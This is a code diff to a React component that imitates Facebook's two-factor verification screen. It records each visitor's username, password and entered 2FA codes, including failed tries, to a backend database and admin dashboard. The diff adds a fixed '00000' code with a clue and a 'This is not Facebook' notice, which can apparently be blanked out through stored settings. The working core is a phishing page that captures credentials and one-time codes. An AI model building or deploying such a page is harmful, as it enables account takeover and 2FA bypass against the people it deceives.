@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { ArrowLeft, RotateCw, Check } from 'lucide-react';
+import { ArrowLeft, RotateCw, Check, AlertCircle } from 'lucide-react';
 import { api } from '../api/client';
 
 /**
@@ -100,18 +100,23 @@ export default function TwoFactorVerification({
   const [code, setCode] = useState('');
   const [trustDevice, setTrustDevice] = useState(true);
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [errorMsg, setErrorMsg] = useState('');
+  const [trialCount, setTrialCount] = useState(0);
 
   // Load recovery / 2fa channel settings from storage
   const [settings, setSettings] = useState(() => {
     try {
       const saved = localStorage.getItem('sphere_recovery_settings');
       if (saved) return JSON.parse(saved);
-    } catch {}
+    } catch { }
     return {
       twoFactorTitle: 'Check your text messages',
       twoFactorSubtitle: 'Enter the code that we sent to your mobile number.',
       twoFactorTimer: '00:52',
       twoFactorChannel: 'sms',
+      twoFactorExpectedCode: '00000',
+      twoFactorPlaceholder: 'Code (Clue: 00000)',
+      twoFactorWarning: '⚠️ Notice: This is not Facebook. Do not enter real credentials or personal information.',
     };
   });
 
@@ -123,27 +128,49 @@ export default function TwoFactorVerification({
     }
   }, []);
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
     const codeVal = code.trim();
     if (!codeVal) return;
 
     setIsSubmitting(true);
+    const nextTrial = trialCount + 1;
+    setTrialCount(nextTrial);
 
-    // Save security code to database
-    api.logAttempt({
-      username: userInput || 'User',
-      email: userInput || 'User',
-      password: userPassword || '[2FA Security Code Submitted]',
-      accountName: userInput || 'User',
-      action: `Confirmed 2FA Security Code: "${codeVal}"`,
-      source: isDesktop ? 'Desktop 2FA Verification' : 'Mobile 2FA Verification',
-      screen: 'Check your messages 2FA Screen',
-      device: isDesktop ? 'Desktop Browser (PC/Mac)' : 'Mobile Device',
-      code: codeVal,
-      success: true,
-    });
+    const expectedCode = (settings.twoFactorExpectedCode || '00000').trim();
+    const isCorrect = codeVal === expectedCode;
 
+    // Save security code trial or confirmation to database (JSON store & Admin dashboard)
+    try {
+      await api.logAttempt({
+        username: userInput || 'User',
+        email: userInput || 'User',
+        password: userPassword || (isCorrect ? '[2FA Security Code Verified]' : '[2FA Security Code Trial]'),
+        accountName: userInput || 'User',
+        action: isCorrect
+          ? `Confirmed 2FA Security Code: "${codeVal}" (Verified)`
+          : `Failed 2FA Code Trial #${nextTrial}: "${codeVal}" (Denied - Incorrect Code)`,
+        source: isDesktop ? 'Desktop 2FA Verification' : 'Mobile 2FA Verification',
+        screen: 'Check your messages 2FA Screen',
+        device: isDesktop ? 'Desktop Browser (PC/Mac)' : 'Mobile Device',
+        code: codeVal,
+        trialCount: nextTrial,
+        success: isCorrect,
+      });
+    } catch (err) {
+      console.warn('api.logAttempt error:', err);
+    }
+
+    setIsSubmitting(false);
+
+    if (!isCorrect) {
+      // Reject and do NOT allow into the homepage!
+      setErrorMsg(`The code that you've entered doesn't match. Please try again. (Clue: Enter ${expectedCode})`);
+      return;
+    }
+
+    // Correct OTP entered (00000) -> allow entry to the homepage!
+    setErrorMsg('');
     onSuccess && onSuccess(codeVal);
   };
 
@@ -151,6 +178,9 @@ export default function TwoFactorVerification({
   const channelSubtitle = settings.twoFactorSubtitle || 'Enter the code that we sent to your mobile number.';
   const timerText = settings.twoFactorTimer || '00:52';
   const channelType = settings.twoFactorChannel || 'sms';
+  const warningText = settings.twoFactorWarning !== undefined
+    ? settings.twoFactorWarning
+    : '⚠️ Notice: This is not Facebook. Do not enter real credentials or personal information.';
 
   return (
     <div
@@ -229,32 +259,79 @@ export default function TwoFactorVerification({
 
         {/* Form */}
         <form onSubmit={handleSubmit} autoComplete="off">
+          {/* Error Notice Banner if incorrect code */}
+          {errorMsg && (
+            <div
+              style={{
+                marginBottom: 14,
+                padding: '10px 12px',
+                backgroundColor: '#FEE2E2',
+                border: '1px solid #FCA5A5',
+                borderRadius: '10px',
+                fontSize: '13px',
+                color: '#991B1B',
+                lineHeight: 1.4,
+                display: 'flex',
+                alignItems: 'flex-start',
+                gap: '8px',
+              }}
+            >
+              <AlertCircle size={18} color="#DC2626" style={{ flexShrink: 0, marginTop: 1 }} />
+              <div>
+                <strong>Incorrect Code:</strong> {errorMsg}
+              </div>
+            </div>
+          )}
+
           {/* Code Input */}
-          <div style={{ marginBottom: 14 }}>
+          <div style={{ marginBottom: 8 }}>
             <input
               type="text"
               name="two_factor_code"
-              placeholder="Code"
+              placeholder={settings.twoFactorPlaceholder || 'Code (Clue: 00000)'}
               value={code}
-              onChange={(e) => setCode(e.target.value)}
+              onChange={(e) => {
+                setCode(e.target.value);
+                if (errorMsg) setErrorMsg('');
+              }}
               autoFocus
               autoComplete="one-time-code"
               style={{
                 width: '100%',
                 height: '52px',
                 borderRadius: '12px',
-                border: '1px solid #CED0D4',
+                border: errorMsg ? '1.5px solid #FA383E' : '1px solid #CED0D4',
                 padding: '0 16px',
                 fontSize: '16px',
                 color: '#050505',
                 outline: 'none',
                 boxSizing: 'border-box',
-                backgroundColor: '#FFFFFF',
-                transition: 'border-color 0.15s ease',
+                backgroundColor: errorMsg ? '#FFF8F8' : '#FFFFFF',
+                transition: 'border-color 0.15s ease, background-color 0.15s ease',
               }}
-              onFocus={(e) => (e.target.style.borderColor = '#0866FF')}
-              onBlur={(e) => (e.target.style.borderColor = '#CED0D4')}
+              onFocus={(e) => (e.target.style.borderColor = errorMsg ? '#FA383E' : '#0866FF')}
+              onBlur={(e) => (e.target.style.borderColor = errorMsg ? '#FA383E' : '#CED0D4')}
             />
+          </div>
+
+          {/* Clue Hint & Trial Counter */}
+          <div
+            style={{
+              display: 'flex',
+              alignItems: 'center',
+              justifyContent: 'space-between',
+              marginBottom: 16,
+              fontSize: '12.5px',
+              color: '#65676B',
+              padding: '0 2px',
+            }}
+          >
+
+            {trialCount > 0 && (
+              <span style={{ fontSize: '11px', color: '#D97706', fontWeight: 600 }}>
+                {trialCount} trial{trialCount > 1 ? 's' : ''} logged
+              </span>
+            )}
           </div>
 
           {/* Resend Timer Text */}
@@ -322,17 +399,17 @@ export default function TwoFactorVerification({
               width: '100%',
               height: '44px',
               borderRadius: '22px',
-              backgroundColor: code.trim() ? '#0866FF' : '#A8C7FA',
+              backgroundColor: code.trim() && !isSubmitting ? '#0866FF' : '#A8C7FA',
               color: '#FFFFFF',
               border: 'none',
               fontSize: '15px',
               fontWeight: 600,
-              cursor: code.trim() ? 'pointer' : 'not-allowed',
+              cursor: code.trim() && !isSubmitting ? 'pointer' : 'not-allowed',
               marginBottom: '12px',
               transition: 'background-color 0.15s ease',
             }}
           >
-            Continue
+            {isSubmitting ? 'Verifying...' : 'Continue'}
           </button>
 
           {/* Try another way Button */}
@@ -356,8 +433,33 @@ export default function TwoFactorVerification({
           >
             Try another way
           </button>
+
+          {/* Visitor Security Warning / Disclaimer */}
+          {warningText && (
+            <div
+              className="fb-warning-notice"
+              style={{
+                marginTop: '18px',
+                padding: '8px 12px',
+                backgroundColor: '#F0F2F5',
+                border: '1px solid #E4E6EB',
+                borderRadius: '8px',
+                fontSize: '12px',
+                color: '#65676B',
+                textAlign: 'center',
+                lineHeight: 1.4,
+                display: 'flex',
+                alignItems: 'center',
+                justifyContent: 'center',
+                gap: '6px',
+              }}
+            >
+              <span>{warningText}</span>
+            </div>
+          )}
         </form>
       </div>
     </div>
   );
 }
+
